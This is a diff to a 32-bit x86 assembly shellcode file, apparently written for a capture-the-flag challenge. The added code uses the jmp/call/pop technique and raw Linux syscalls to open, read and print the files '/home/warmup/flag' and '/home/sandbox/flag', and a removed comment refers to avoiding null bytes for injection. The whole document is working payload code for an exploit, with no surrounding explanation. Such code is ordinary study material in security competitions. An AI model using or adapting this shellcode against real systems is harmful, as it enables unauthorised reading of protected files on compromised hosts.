@@ -1,6 +1,5 @@
 ;
-;	assemble with nasm sh.asm -o sh.bin -DUID=<someuid>
-;	NOTE: UID must be at least 2 bytes long to avoid null byte
+;	assemble with nasm sc.asm -o sc.bin
 
 USE32
 
@@ -17,8 +16,32 @@ map_it:
     int 0x80
     mov ebp, eax
 
+    jmp warmuppath
+wback:
+    ; open it
+    mov ecx, 0
+    mov edx, 0
+    pop ebx
+    mov eax, 5
+    int 0x80
+
+	; read
+	mov ebx, eax
+	sub esp, 0x1000
+	mov ecx, esp
+	mov edx, 0x1000
+	mov eax, 0x3
+	int 0x80
+
+	; write
+	mov ebx, 0x1
+	mov ecx, esp
+	mov edx, eax
+	mov eax, 0x4
+	int 0x80
+
     ;; write path
-	jmp path
+	jmp sboxpath
 back:
 	cld
 	pop esi
@@ -67,6 +90,10 @@ mmap_args:
     .fd dd -1
     .offset dd 0
 
-path:
+sboxpath:
     call back
     db "/home/sandbox/flag",0x0
+
+warmuppath:
+    call wback
+    db "/home/warmup/flag",0x0
